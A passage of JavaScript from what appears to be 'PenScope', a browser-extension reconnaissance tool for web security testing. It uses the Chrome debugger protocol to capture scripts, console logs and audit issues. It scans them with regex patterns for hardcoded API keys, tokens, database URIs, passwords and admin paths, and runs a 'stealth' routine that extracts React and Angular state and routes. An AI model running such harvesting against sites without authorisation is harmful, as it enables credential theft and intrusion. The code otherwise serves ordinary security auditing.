        tab._loadTimers.push(setTimeout(()=>detectWasmModules(tabId),8000));
        tab._loadTimers.push(setTimeout(()=>hookBroadcastChannels(tabId),8500));
        tab._loadTimers.push(setTimeout(()=>detectWebRTCLeaks(tabId),9000));
        tab._loadTimers.push(setTimeout(()=>detectCoopCoep(tabId),9500));
      }
      break;}

    // -------------------------------------------------------
    // v5: DEBUGGER DOMAIN — Script source extraction
    // -------------------------------------------------------
    case "Debugger.scriptParsed":{
      // Track every script the browser parses — we'll extract source later
      if(!_scripts[tabId])_scripts[tabId]=new Map();
      const url=params.url||"";
      const id=params.scriptId;
      if(!url||url.startsWith("chrome-extension://")||url.startsWith("extensions::")||url==="")break;
      // Only track scripts from the target domain or interesting third-parties
      if(url.startsWith("http")){
        _scripts[tabId].set(id,{url,length:params.endLine||0,hash:params.hash||"",sourceMapURL:params.sourceMapURL||"",hasSourceURL:params.hasSourceURL||false});
        // Capture source map URLs from script metadata
        if(params.sourceMapURL&&!seen(tabId,"sm-dbg",params.sourceMapURL)){
          tab.sourceMaps.push({url,mapUrl:params.sourceMapURL,source:"debugger-parsed"});
        }
      }
      break;}

    // -------------------------------------------------------
    // v5: LOG DOMAIN — Console message capture
    // -------------------------------------------------------
    case "Log.entryAdded":{
      const entry=params.entry;if(!entry)break;
      const text=entry.text||"";
      const level=entry.level||"info"; // verbose, info, warning, error
      const logUrl=entry.url||"";
      // Filter out noise — only capture warnings, errors, and info with interesting content
      if(level==="verbose")break;
      const isInteresting=level==="error"||level==="warning"||
        /(?:api|token|key|secret|password|auth|admin|permission|role|debug|stack|trace|exception|failed|denied|unauthorized|forbidden)/i.test(text);
      if(!isInteresting&&tab.consoleLogs.length>50)break;
      if(!seen(tabId,"log",`${level}:${text.substring(0,60)}`)){
        tab.consoleLogs.push({
          level,
          text:text.substring(0,1000),
          url:logUrl.substring(0,200),
          source:entry.source||"",
          lineNumber:entry.lineNumber||0,
          timestamp:Date.now()
        });
        if(tab.consoleLogs.length>200)tab.consoleLogs=tab.consoleLogs.slice(-200);
      }
      break;}

    // -------------------------------------------------------
    // v5: AUDITS DOMAIN — Chrome security findings
    // -------------------------------------------------------
    case "Audits.issueAdded":{
      const issue=params.issue;if(!issue)break;
      const code=issue.code||"unknown";
      const details=issue.details||{};
      // Extract different issue types
      let finding=null;
      if(details.mixedContentIssueDetails){const d=details.mixedContentIssueDetails;finding={type:"Mixed Content",severity:"medium",url:d.request?.url||"",resourceType:d.resourceType||"",resolutionStatus:d.resolutionStatus||"",mainResourceURL:d.mainResourceURL||""};}
      else if(details.cookieIssueDetails){const d=details.cookieIssueDetails;finding={type:"Cookie Issue",severity:"low",cookieName:d.cookie?.name||"",cookieDomain:d.cookie?.domain||"",cookieWarningReasons:(d.cookieWarningReasons||[]).join(", "),cookieExclusionReasons:(d.cookieExclusionReasons||[]).join(", ")};}
      else if(details.blockedByResponseIssueDetails){const d=details.blockedByResponseIssueDetails;finding={type:"Blocked by Response",severity:"medium",url:d.request?.url||"",reason:d.reason||""};}
      else if(details.contentSecurityPolicyIssueDetails){const d=details.contentSecurityPolicyIssueDetails;finding={type:"CSP Violation",severity:"high",violatedDirective:d.violatedDirective||"",blockedURL:d.blockedURL||"",sourceCodeLocation:d.sourceCodeLocation?`${d.sourceCodeLocation.url}:${d.sourceCodeLocation.lineNumber}`:""  };}
      else if(details.deprecationIssueDetails){const d=details.deprecationIssueDetails;finding={type:"Deprecated API",severity:"info",message:d.message||"",sourceCodeLocation:d.sourceCodeLocation?`${d.sourceCodeLocation.url}:${d.sourceCodeLocation.lineNumber}`:""  };}
      else{finding={type:code,severity:"info",raw:JSON.stringify(details).substring(0,500)};}
      if(finding&&!seen(tabId,"audit",`${finding.type}:${(finding.url||finding.cookieName||finding.violatedDirective||"").substring(0,60)}`)){
        tab.auditIssues.push(finding);
      }
      break;}

    // -------------------------------------------------------
    // v5: RUNTIME — Execution context tracking
    // -------------------------------------------------------
    case "Runtime.executionContextCreated":{
      const ctx=params.context;if(!ctx)break;
      // Skip chrome-extension contexts — they're just the user's other extensions
      if(ctx.origin&&ctx.origin.startsWith("chrome-extension://"))break;
      if(ctx.origin&&ctx.origin!=="://"&&!seen(tabId,"ctx",`${ctx.id}:${ctx.origin}`)){
        tab.executionContexts.push({
          id:ctx.id,
          origin:ctx.origin||"",
          name:ctx.name||"",
          type:ctx.auxData?.type||"",
          isDefault:ctx.auxData?.isDefault||false,
          frameId:ctx.auxData?.frameId||"",
        });
      }
      break;}
  }
});

// v5.8: Severity weighting — adjust a finding's severity based on where it was found and what
// signal it actually carries. The old "every regex match is critical" approach produces too much
// noise on real targets. Rules (all additive, clamped to [info..critical]):
//   +1 severity: found in cookie, Authorization header, or response body of an authenticated API
//   +1 severity: value looks like a live JWT (has three base64 parts + exp claim in the future)
//   -1 severity: found in a comment, TODO, or localization file
//   -1 severity: pattern is a stack trace / SQL error but status code is 2xx (unlikely real error)
//   -1 severity: pattern is "Email" / "Internal ID" and the value matches a known test pattern
// Returns the adjusted severity string.
const _SEV_ORDER=["info","low","medium","high","critical"];
function weighSeverity(baseSev,opts){
  let score=_SEV_ORDER.indexOf(baseSev);
  if(score<0)score=0;
  if(opts){
    if(opts.inCookie||opts.inAuthHeader||opts.inAuthenticatedApi)score++;
    if(opts.valueIsLiveJwt)score++;
    if(opts.inComment||opts.inLocalization)score--;
    if(opts.successStatus&&opts.patternIsError)score--;
    if(opts.valueLooksLikeTest)score--;
  }
  score=Math.max(0,Math.min(4,score));
  return _SEV_ORDER[score];
}
function looksLikeTestValue(v){
  if(!v||typeof v!=="string")return false;
  const low=v.toLowerCase();
  return /test|example|sample|foo@bar|placeholder|dummy|lorem|asdf|john\.doe|jane\.doe|no-?reply/i.test(low);
}
function scanResponseBody(tabId,meta,body){
  const tab=T(tabId);
  const isSuccess=meta.status>=200&&meta.status<300;
  const isAuthPath=/\/api\/|\/v\d+\/|\/graphql|\/auth|\/account|\/me\b/i.test(meta.url||"");
  RESP_PATTERNS.forEach(pat=>{
    let count=0;
    for(const match of body.matchAll(pat.regex)){
      if(count>=3)break;
      count++;
      const val=match[1]||match[0];
      const fKey=`${pat.name}:${val.substring(0,30)}:${meta.url.substring(0,60)}`;
      if(seen(tabId,"rb",fKey))continue;
      const s=Math.max(0,match.index-30),e=Math.min(body.length,match.index+match[0].length+30);
      const ctx=body.substring(s,e).replace(/[\n\r]/g," ").substring(0,250);
      const weighted=weighSeverity(pat.sev,{
        inAuthenticatedApi:isAuthPath,
        successStatus:isSuccess,
        patternIsError:/Stack trace|SQL error|MongoDB error/i.test(pat.name),
        valueLooksLikeTest:looksLikeTestValue(val),
        inComment:/\/\/|\/\*|#/.test(ctx.substring(0,20))
      });
      tab.responseBodies.push({pattern:pat.name,severity:weighted,description:pat.desc,value:val.substring(0,200),context:ctx,url:meta.url,status:meta.status,mimeType:meta.mimeType});
    }
  });
}

// -------------------------------------------------------
// v5.1: SCAN JS VIA NETWORK DOMAIN
// This is the key fix: scripts parsed before Debugger.enable
// never fire Debugger.scriptParsed, so getScriptSource can't
// reach them. But Network.getResponseBody CAN — it captures
// every JS file that loads. We grep the same patterns here.
// -------------------------------------------------------
function scanScriptViaNetwork(tabId,source,scriptUrl){
  const tab=T(tabId);
  const sourceLen=source.length;
  const isLocale=/localization|locale|i18n|\/[a-z]{2}[-_][a-z]{2}\.js/i.test(scriptUrl);

  // Run SCRIPT_PATTERNS (secrets + endpoint patterns)
  SCRIPT_PATTERNS.forEach(pat=>{
    // Skip password pattern for localization files — they contain UI labels not real passwords
    if(isLocale&&pat.name==="Hardcoded Password")return;
    let count=0;
    for(const match of source.matchAll(pat.regex)){
      if(count>=15)break;
      count++;
      const val=pat.extract?match[pat.extract]:match[0];
      const fKey=`ss:${pat.name}:${val.substring(0,40)}`;
      if(seen(tabId,"ss",fKey))continue;
      tab.scriptSources.push({
        pattern:pat.name,
        severity:pat.sev,
        value:val.substring(0,300),
        scriptUrl:scriptUrl.substring(0,150),
        scriptSize:sourceLen,
        context:source.substring(Math.max(0,match.index-40),Math.min(sourceLen,match.index+match[0].length+40)).replace(/[\n\r]/g," ").substring(0,200),
      });
    }
  });

  // Run deep endpoint extraction
  deepExtractEndpoints(source,scriptUrl,tabId);

  // Check for sourceMappingURL
  const smMatch=source.match(/\/\/[#@]\s*sourceMappingURL\s*=\s*(\S+)/);
  if(smMatch&&!seen(tabId,"sm-net",smMatch[1])){
    let mapUrl=smMatch[1];
    if(!mapUrl.startsWith("http")&&!mapUrl.startsWith("data:")){
      try{const base=scriptUrl.split("?")[0];mapUrl=new URL(mapUrl,base).href;}catch(e){console.warn('[PenScope] sourceMapURL resolve',e.message||e);}
    }
    tab.sourceMaps.push({url:scriptUrl,mapUrl,source:"network-body"});
  }
}

// -------------------------------------------------------
// v5.1: SCRIPT SOURCE PATTERNS
// Used by BOTH paths:
//   1. Network.getResponseBody → scanScriptViaNetwork() — catches ALL JS (even pre-Debugger)
//   2. Debugger.getScriptSource → extractAllScriptSources() — catches dynamic/late scripts
// -------------------------------------------------------
const SCRIPT_PATTERNS=[
  // === v5.1 EXPANDED: API endpoint extraction — broader patterns ===
  {name:"API Endpoint",regex:/["'](\/api\/[a-zA-Z0-9_\-/.:{}\[\]]+)["']/g,sev:"info",extract:1},
  {name:"API Endpoint",regex:/["'](\/v\d+\/[a-zA-Z0-9_\-/.:{}\[\]]+)["']/g,sev:"info",extract:1},
  {name:"GraphQL Endpoint",regex:/["'](\/graphql[a-zA-Z0-9_\-/]*)["']/g,sev:"medium",extract:1},
  // Generic URL path strings — any path-like string 2+ segments deep
  {name:"URL Path",regex:/["'](\/[a-z][a-z0-9_-]*(?:\/[a-z0-9_\-:.{}]+){1,8})["']/gi,sev:"info",extract:1},
  // fetch()/axios/$http/request call site extraction
  {name:"fetch() URL",regex:/fetch\s*\(\s*["'`](\/[^"'`\s]{2,120})["'`]/g,sev:"info",extract:1},
  {name:"fetch() URL",regex:/fetch\s*\(\s*["'`](https?:\/\/[^"'`\s]{5,200})["'`]/g,sev:"info",extract:1},
  {name:"axios URL",regex:/axios\s*\.\s*(?:get|post|put|patch|delete|head|options|request)\s*\(\s*["'`](\/[^"'`\s]{2,120})["'`]/g,sev:"info",extract:1},
  {name:"axios URL",regex:/axios\s*\(\s*\{[^}]*url\s*:\s*["'`](\/[^"'`\s]{2,120})["'`]/g,sev:"info",extract:1},
  {name:"$http URL",regex:/\$http\s*\.\s*(?:get|post|put|patch|delete)\s*\(\s*["'`](\/[^"'`\s]{2,120})["'`]/g,sev:"info",extract:1},
  {name:"XMLHttpRequest URL",regex:/\.open\s*\(\s*["'][A-Z]+["']\s*,\s*["'`](\/[^"'`\s]{2,120})["'`]/g,sev:"info",extract:1},
  {name:"Template URL",regex:/(?:fetch|axios\.\w+|request|\$http\.\w+)\s*\(\s*`(\/[^`]{2,120})`/g,sev:"info",extract:1},
  // Route definition patterns (React Router, Vue Router, Angular, Express)
  {name:"Route Definition",regex:/path\s*:\s*["'](\/[^"']{1,100})["']/g,sev:"info",extract:1},
  {name:"JSX Route",regex:/<Route\s+[^>]*path\s*=\s*["'](\/[^"']{1,100})["']/g,sev:"info",extract:1},
  {name:"JSX Route",regex:/<(?:PrivateRoute|ProtectedRoute|AuthRoute|AdminRoute)\s+[^>]*path\s*=\s*["'](\/[^"']{1,100})["']/g,sev:"info",extract:1},
  {name:"JSX Link",regex:/<(?:Link|NavLink)\s+[^>]*to\s*=\s*["'](\/[^"']{1,100})["']/g,sev:"info",extract:1},
  {name:"Express Route",regex:/(?:router|app)\s*\.\s*(?:get|post|put|patch|delete|all|use)\s*\(\s*["'](\/[^"']{1,100})["']/g,sev:"info",extract:1},
  {name:"Navigate",regex:/(?:navigate|redirect|push|replace)\s*\(\s*["'`](\/[^"'`]{1,100})["'`]/g,sev:"info",extract:1},
  {name:"history.push",regex:/history\s*\.\s*(?:push|replace)\s*\(\s*["'`](\/[^"'`]{1,100})["'`]/g,sev:"info",extract:1},
  {name:"router.push",regex:/(?:\$router|\brouter)\s*\.\s*(?:push|replace)\s*\(\s*(?:\{[^}]*path\s*:\s*)?["'](\/[^"']{1,100})["']/g,sev:"info",extract:1},
  // GraphQL operation names (reveals schema without introspection)
  {name:"GraphQL Query",regex:/(?:query|mutation|subscription)\s+([A-Z][a-zA-Z0-9_]+)\s*[({]/g,sev:"info",extract:1},
  {name:"GraphQL Type",regex:/__typename\s*===?\s*["']([A-Z][a-zA-Z0-9_]+)["']/g,sev:"info",extract:1},
  // OpenAPI/Swagger embedded paths
  {name:"OpenAPI Path",regex:/"(\/[a-zA-Z0-9_\-/{}.]+)"\s*:\s*\{\s*"(?:get|post|put|patch|delete|options|head)"/g,sev:"info",extract:1},
  // Base URL config
  {name:"Base URL Config",regex:/(?:baseURL|baseUrl|apiUrl|API_URL|apiHost|API_HOST|API_BASE|BACKEND_URL|SERVER_URL)\s*[:=]\s*["'`](https?:\/\/[^"'`\s]+)["'`]/gi,sev:"medium",extract:1},
  // Service/Resource URL patterns
  {name:"Service URL",regex:/(?:this|self)\s*\.\s*(?:url|baseUrl|endpoint|apiUrl|path)\s*=\s*["'](\/[^"']{2,100})["']/g,sev:"info",extract:1},
  {name:"$resource URL",regex:/\$resource\s*\(\s*["'](\/[^"']{2,100})["']/g,sev:"info",extract:1},
  // Webpack chunk patterns
  {name:"Webpack Chunk",regex:/["'](?:static\/js|chunks|_next\/static)\/([^"'\s]+\.js)["']/g,sev:"info",extract:1},
  // === ORIGINAL SECRET PATTERNS ===
  {name:"Hardcoded AWS Key",regex:/AKIA[0-9A-Z]{16}/g,sev:"critical",extract:0},
  {name:"Hardcoded Google Key",regex:/AIza[0-9A-Za-z_-]{35}/g,sev:"high",extract:0},
  {name:"Hardcoded JWT",regex:/eyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}/g,sev:"high",extract:0},
  {name:"Hardcoded Stripe Key",regex:/(?:sk|pk|rk)_(?:live|test)_[A-Za-z0-9]{20,}/g,sev:"critical",extract:0},
  {name:"Hardcoded GitHub Token",regex:/gh[ps]_[A-Za-z0-9_]{36,}/g,sev:"high",extract:0},
  {name:"Hardcoded Slack Token",regex:/xox[bpors]-[A-Za-z0-9-]{10,}/g,sev:"high",extract:0},
  {name:"Hardcoded Private Key",regex:/-----BEGIN (?:RSA |EC |DSA )?PRIVATE KEY-----/g,sev:"critical",extract:0},
  {name:"MongoDB URI",regex:/mongodb(?:\+srv)?:\/\/[^\s"'<>]{10,}/g,sev:"critical",extract:0},
  {name:"PostgreSQL URI",regex:/postgres(?:ql)?:\/\/[^\s"'<>]{10,}/g,sev:"critical",extract:0},
  {name:"MySQL URI",regex:/mysql:\/\/[^\s"'<>]{10,}/g,sev:"critical",extract:0},
  {name:"Redis URI",regex:/redis:\/\/[^\s"'<>]{10,}/g,sev:"high",extract:0},
  // Interesting patterns
  {name:"Internal URL",regex:/["'](https?:\/\/(?:localhost|127\.0\.0\.1|10\.\d+|172\.(?:1[6-9]|2\d|3[01])\.|192\.168\.)[^\s"']*)/g,sev:"high",extract:1},
  {name:"Internal URL",regex:/["'](https?:\/\/[a-z0-9-]+\.(?:internal|local|corp|intranet|dev|staging|test)\.[a-z]+[^\s"']*)/g,sev:"high",extract:1},
  {name:"S3 Bucket",regex:/["'](?:https?:\/\/)?([a-z0-9.-]+\.s3[.-](?:amazonaws\.com|[a-z-]+\.amazonaws\.com))[^\s"']*/g,sev:"medium",extract:1},
  {name:"Firebase URL",regex:/["'](https?:\/\/[a-z0-9-]+\.firebaseio\.com)[^\s"']*/g,sev:"medium",extract:1},
  {name:"Firebase Config",regex:/apiKey\s*:\s*["']([^"']+)/g,sev:"high",extract:1},
  {name:"TODO/FIXME/HACK",regex:/\/\/\s*(?:TODO|FIXME|HACK|XXX|BUG|SECURITY|TEMP|WORKAROUND)[:\s]+([^\n]{5,80})/gi,sev:"info",extract:1},
  {name:"Hardcoded Password",regex:/(?:password|passwd|pwd|secret)\s*[:=]\s*["']([^"']{4,50})["']/gi,sev:"critical",extract:1},
  {name:"Admin Path",regex:/["'](\/(?:admin|dashboard\/admin|backoffice|manage|internal|debug|_debug|__admin)[a-zA-Z0-9_\-/]*)["']/gi,sev:"medium",extract:1},
  {name:"Dangerous Function",regex:/\b(eval|Function|setTimeout|setInterval)\s*\(\s*[a-zA-Z_$]/g,sev:"low",extract:0},
  {name:"Sentry DSN",regex:/https?:\/\/[a-f0-9]+@[a-z0-9.]+\.ingest\.sentry\.io\/\d+/g,sev:"medium",extract:0},
  {name:"Datadog Client Token",regex:/pub[a-f0-9]{32}/g,sev:"medium",extract:0},
  // AI/LLM API keys
  {name:"OpenAI API Key",regex:/sk-[a-zA-Z0-9]{20,}T3BlbkFJ[a-zA-Z0-9]{20,}/g,sev:"critical",extract:0},
  {name:"Anthropic API Key",regex:/sk-ant-api03-[a-zA-Z0-9_-]{90,}/g,sev:"critical",extract:0},
  {name:"Google AI Key",regex:/AIza[A-Za-z0-9_-]{35}/g,sev:"high",extract:0},
  {name:"HuggingFace Token",regex:/hf_[a-zA-Z0-9]{34,}/g,sev:"high",extract:0},
  // v5.6: Service Worker introspection — reveals client-side proxy/cache logic + cache-poisoning surface
  {name:"SW Route Handler",regex:/(?:workbox\.routing\.)?registerRoute\s*\(/g,sev:"info",extract:0},
  {name:"SW Cache Strategy",regex:/new\s+(CacheFirst|NetworkFirst|StaleWhileRevalidate|NetworkOnly|CacheOnly)\s*\(/g,sev:"info",extract:1},
  {name:"SW Fetch Intercept",regex:/self\.addEventListener\s*\(\s*["']fetch["']/g,sev:"medium",extract:0},
  {name:"SW Cache Name",regex:/caches\.(?:open|match|delete)\s*\(\s*["']([^"']{2,100})["']/g,sev:"info",extract:1},
  {name:"SW Push Handler",regex:/self\.addEventListener\s*\(\s*["']push["']/g,sev:"medium",extract:0},
  {name:"SW Skip Waiting",regex:/self\.skipWaiting\s*\(\s*\)/g,sev:"info",extract:0},
  {name:"SW Precache",regex:/(?:workbox\.precaching\.)?precacheAndRoute\s*\(/g,sev:"info",extract:0},
  // v5.6: Prototype pollution and DOM clobbering sinks
  {name:"__proto__ Assignment",regex:/\[\s*["']__proto__["']\s*\]\s*=/g,sev:"medium",extract:0},
  {name:"Object.prototype Assignment",regex:/Object\.(?:assign|defineProperty)\s*\(\s*(?:[a-zA-Z_$][\w$]*\.__proto__|Object\.prototype)/g,sev:"high",extract:0},
  // v5.6: postMessage wildcard target (common XSS via iframe)
  {name:"postMessage Wildcard",regex:/\.postMessage\s*\([^,)]{1,300}?,\s*["']\*["']/g,sev:"medium",extract:0},
];

// -------------------------------------------------------
// v5.1: DEEP ENDPOINT EXTRACTION FROM SCRIPT SOURCE
// Aggressively extracts ALL URL paths from script source
// -------------------------------------------------------
function deepExtractEndpoints(source,scriptUrl,tabId){
  const tab=T(tabId);
  const foundPaths=new Set();

  // 1. All string literals that look like URL paths
  const pathRegex=/["'`](\/[a-z][a-z0-9_\-./:{}\[\]*]+(?:\?[^"'`]*)?)["'`]/gi;
  for(const match of source.matchAll(pathRegex)){
    const path=match[1];
    if(path.length<3||path.length>200)continue;
    if(/\.(js|css|html|htm|png|jpg|jpeg|gif|svg|ico|woff|woff2|ttf|eot|map|json|xml|txt|md|pdf|mp4|webm|mp3)$/i.test(path))continue;
    if(/^\/\/./.test(path))continue;
    if(/^\/(node_modules|bower_components|vendor|dist|build|assets|static\/(?:css|js|img|fonts|media)|_next\/static|__webpack)/.test(path))continue;
    if(/^\/$/.test(path))continue;
    const clean=path.replace(/\/+$/,"");
    if(clean.length>=3)foundPaths.add(clean);
  }

  // 2. Concatenated URL strings: "/api/" + version + "/users"
  const concatRegex=/["'](\/[a-zA-Z0-9_\-/]+)["']\s*\+/g;
  for(const match of source.matchAll(concatRegex)){
    const path=match[1].replace(/\/+$/,"");
    if(path.length>=3&&!/\.(js|css)$/i.test(path))foundPaths.add(path);
  }

  // 3. REST resource maps: {users: "/api/users", posts: "/api/posts"}
  const objPathRegex=/["']?(\w+)["']?\s*:\s*["'](\/(?:api|v\d+)[^"']{2,80})["']/g;
  for(const match of source.matchAll(objPathRegex)){
    foundPaths.add(match[2].replace(/\/+$/,""));
  }

  // 4. URL/ENDPOINT/PATH constant maps
  const enumRegex=/(?:URL|ENDPOINT|PATH|ROUTE|API)\s*[.:=]\s*\{([^}]{10,2000})\}/gi;
  for(const match of source.matchAll(enumRegex)){
    const innerRegex=/["'](\/[a-zA-Z0-9_\-/.:{}\[\]]+)["']/g;
    for(const inner of match[1].matchAll(innerRegex)){
      if(inner[1].length>=3)foundPaths.add(inner[1].replace(/\/+$/,""));
    }
  }

  // 5. GraphQL operations from gql template literals
  const gqlRegex=/(?:gql|graphql)\s*`([^`]{10,5000})`/g;
  for(const match of source.matchAll(gqlRegex)){
    const gqlBody=match[1];
    const nameRegex=/(?:query|mutation|subscription)\s+([A-Z]\w+)/g;
    for(const nameMatch of gqlBody.matchAll(nameRegex)){
      if(!seen(tabId,"dr",`gql:${nameMatch[1]}`)){
        tab.discoveredRoutes.push({path:nameMatch[1],source:"graphql-operation",type:gqlBody.trimStart().startsWith("mutation")?"mutation":"query",scriptUrl:scriptUrl.substring(0,150),context:gqlBody.substring(0,200).replace(/[\n\r]+/g," ").trim()});
      }
    }
  }

  // Push all discovered paths
  foundPaths.forEach(path=>{
    if(!seen(tabId,"dr",path)){
      const tags=tagEndpoint(path);
      tab.discoveredRoutes.push({path,source:"script-source",type:tags.length?tags[0].tag:"endpoint",scriptUrl:scriptUrl.substring(0,150),tags,context:""});
    }
  });
}

function extractAllScriptSources(tabId){
  if(!_debugTabs.has(tabId)||!_scripts[tabId])return;
  const tab=T(tabId);
  const scripts=_scripts[tabId];
  let processed=0;
  const maxScripts=80; // v5.1: increased from 50

  scripts.forEach((info,scriptId)=>{
    if(processed>=maxScripts)return;
    const url=info.url||"";
    if(url.includes("google-analytics")||url.includes("gtag")||url.includes("translate.googleapis")||url.includes("gstatic.com")||url.includes("recaptcha")||url.includes("googletagmanager"))return;
    processed++;

    chrome.debugger.sendCommand({tabId},"Debugger.getScriptSource",{scriptId},(result)=>{
      if(chrome.runtime.lastError||!result||!result.scriptSource)return;
      const source=result.scriptSource;
      const sourceLen=source.length;
      if(sourceLen<100)return;
      const isLocale=/localization|locale|i18n|\/[a-z]{2}[-_][a-z]{2}\.js/i.test(url);

      // Pattern grep (secrets + endpoints)
      SCRIPT_PATTERNS.forEach(pat=>{
        if(isLocale&&pat.name==="Hardcoded Password")return;
        let count=0;
        for(const match of source.matchAll(pat.regex)){
          if(count>=15)break;
          count++;
          const val=pat.extract?match[pat.extract]:match[0];
          const fKey=`ss:${pat.name}:${val.substring(0,40)}`;
          if(seen(tabId,"ss",fKey))continue;
          tab.scriptSources.push({
            pattern:pat.name,
            severity:pat.sev,
            value:val.substring(0,300),
            scriptUrl:url.substring(0,150),
            scriptSize:sourceLen,
            context:source.substring(Math.max(0,match.index-40),Math.min(sourceLen,match.index+match[0].length+40)).replace(/[\n\r]/g," ").substring(0,200),
          });
        }
      });

      // v5.1: Deep endpoint extraction
      deepExtractEndpoints(source,url,tabId);

      // Inline sourceMappingURL
      const smMatch=source.match(/\/\/[#@]\s*sourceMappingURL\s*=\s*(\S+)/);
      if(smMatch&&!seen(tabId,"sm-inline",smMatch[1])){
        let mapUrl=smMatch[1];
        if(!mapUrl.startsWith("http")&&!mapUrl.startsWith("data:")){
          try{const base=url.split("?")[0];mapUrl=new URL(mapUrl,base).href;}catch(e){console.warn('[PenScope] debugger sourceMapURL resolve',e.message||e);}
        }
        tab.sourceMaps.push({url,mapUrl,source:"debugger-inline"});
      }
    });
  });
}
chrome.debugger.onDetach.addListener((source)=>{_debugTabs.delete(source.tabId);if(state[source.tabId])state[source.tabId].deepEnabled=false;});

// -------------------------------------------------------
// 3b. STEALTH RUNTIME EXTRACTION — via Runtime.evaluate
//     Zero page modifications. Zero prototype patches.
//     Zero injected scripts. Pure debugger observation.
// -------------------------------------------------------
function _extractionCode(){
  var R={framework:null,services:[],routes:[],stores:[],protoMethods:[],eventListeners:[],runtimeSecrets:[],frameworkState:{},interestingGlobals:[],ephemeralDOM:[],discoveredRoutes:[]};
  function safeStr(v,max){try{var s=JSON.stringify(v);return s?s.substring(0,max||500):null;}catch(e){return null;}}
  function gArgs(fn){try{var m=fn.toString().match(/\(([^)]*)\)/);return m?m[1].split(",").map(function(a){return a.trim();}).filter(Boolean):[];}catch(e){return[];}}
  var drSeen=new Set();
  function addRoute(path,source,type,extra){
    if(!path||drSeen.has(path+":"+source))return;
    drSeen.add(path+":"+source);
    R.discoveredRoutes.push({path:String(path),source:source,type:type||"unknown",context:extra||""});
  }

  // === FRAMEWORK DETECTION ===
  // AngularJS
  if(window.angular){
    R.framework={name:"AngularJS",version:(window.angular.version&&window.angular.version.full)||"?"};
    var inj=null;var sels=[".ng-scope","[ng-app]","[data-ng-app]"];
    for(var i=0;i<sels.length;i++){try{var el=document.querySelector(sels[i]);if(el){inj=window.angular.element(el).injector();if(inj)break;}}catch(e){}}
    if(inj){
      var svcs=["$http","$location","$rootScope","$templateCache","$cacheFactory","$q","$timeout","$interval","$controller","$injector","$sce"];
      svcs.forEach(function(name){try{var svc=inj.get(name);if(!svc)return;var methods=[];Object.keys(svc).forEach(function(k){if(k.indexOf("$$")===0)return;if(typeof svc[k]==="function")methods.push({name:k,args:gArgs(svc[k])});});if(methods.length>0)R.services.push({name:name,type:"angular-service",methods:methods});}catch(e){}});
      try{var http=inj.get("$http");if(http&&http.defaults)R.frameworkState.httpDefaults={headers:safeStr(http.defaults.headers,1000),xsrfCookieName:http.defaults.xsrfCookieName,xsrfHeaderName:http.defaults.xsrfHeaderName};}catch(e){}
      try{var ij=inj.get("$injector");if(ij&&ij.modules)R.frameworkState.modules=Object.keys(ij.modules);}catch(e){}
      try{var rs=inj.get("$rootScope");if(rs){var sd=[];function wS(scope,depth){if(!scope||depth>10)return;var keys={};var cnt=0;for(var k in scope){if(k.charAt(0)==="$"||k.charAt(0)==="_"||typeof scope[k]==="function")continue;try{var v=JSON.stringify(scope[k]);if(v&&v.length>2&&v.length<3000){keys[k]=v.substring(0,500);cnt++;}}catch(e){}}if(cnt>0)sd.push({depth:depth,keyCount:cnt,data:keys});if(scope.$$childHead)wS(scope.$$childHead,depth+1);if(scope.$$nextSibling)wS(scope.$$nextSibling,depth);}wS(rs,0);sd.sort(function(a,b){return b.keyCount-a.keyCount;});sd.slice(0,10).forEach(function(s,i){R.stores.push({name:"Angular Scope #"+(i+1)+" ("+s.keyCount+" props, depth "+s.depth+")",type:"angular-scope",data:safeStr(s.data,3000)});});}}catch(e){}
      try{var rt=inj.get("$route");if(rt&&rt.routes)Object.keys(rt.routes).forEach(function(p){var r=rt.routes[p];R.routes.push({path:p,templateUrl:r.templateUrl||"",controller:r.controller||""});addRoute(p,"angularjs-$route","route",r.controller||"");});}catch(e){}
      try{var st=inj.get("$state");if(st&&st.get)st.get().forEach(function(s){if(s.name){R.routes.push({path:s.url||s.name,name:s.name,controller:s.controller||""});addRoute(s.url||s.name,"angularjs-ui-router","route",s.name);}});}catch(e){}
      // v5.1: Extract $templateCache — reveals all template URLs (hidden views)
      try{var tc=inj.get("$templateCache");if(tc&&tc.info){var tcInfo=tc.info();if(tcInfo.size>0)R.frameworkState.templateCacheSize=tcInfo.size;}}catch(e){}
    }
  }
  // React + React Router deep extraction
  var reactRoot=document.getElementById("root")||document.getElementById("__next")||document.getElementById("app")||document.querySelector("[data-reactroot]");
  if(reactRoot){var fKey=Object.keys(reactRoot).find(function(k){return k.indexOf("__reactFiber")===0||k.indexOf("__reactInternalInstance")===0;});
    if(fKey){R.framework=R.framework||{name:"React",fiber:true};try{var fiber=reactRoot[fKey];var sts=[];
      function wF(node,d){
        if(!node||d>30)return;
        if(node.memoizedState&&node.type&&node.type.name){try{var ss=JSON.stringify(node.memoizedState);if(ss&&ss.length>10&&ss.length<3000)sts.push({component:node.type.name,state:ss.substring(0,800)});}catch(e){}}
        // v5.1: Extract routes from React Router fiber nodes
        if(node.memoizedProps){
          var props=node.memoizedProps;
          // Route component path prop
          if(props.path){
            var rp=Array.isArray(props.path)?props.path[0]:props.path;
            if(typeof rp==="string"&&rp.startsWith("/"))addRoute(rp,"react-router-fiber","route",node.type?(node.type.displayName||node.type.name||""):"");
          }
          // Link/NavLink/Navigate 'to' prop
          if(props.to&&typeof props.to==="string"&&props.to.startsWith("/"))addRoute(props.to,"react-link-fiber","link");
          if(props.to&&typeof props.to==="object"&&props.to.pathname)addRoute(props.to.pathname,"react-link-fiber","link");
          // Next.js Link 'href' prop
          if(props.href&&typeof props.href==="string"&&props.href.startsWith("/"))addRoute(props.href,"react-href-fiber","link");
        }
        // v5.1: React Router v6 internal route context
        if(node.memoizedState){
          try{
            var rState=node.memoizedState;
            while(rState){
              if(rState.memoizedState&&rState.memoizedState.router&&rState.memoizedState.router.routes){
                (function walkRR6(routes,prefix){
                  routes.forEach(function(r){
                    var full=((prefix||"")+"/"+((r.path||"").replace(/^\//,""))).replace(/\/+/g,"/");
                    if(r.path)addRoute(full,"react-router-v6","route",r.id||"");
                    if(r.children)walkRR6(r.children,full);
                  });
                })(rState.memoizedState.router.routes,"");
              }
              rState=rState.next;
            }
          }catch(e){}
        }
        if(node.child)wF(node.child,d+1);
        if(node.sibling)wF(node.sibling,d);
      }
      wF(fiber,0);if(sts.length)R.stores.push({name:"React States",type:"react-state",data:safeStr(sts.slice(0,20),3000)});}catch(e){}}}
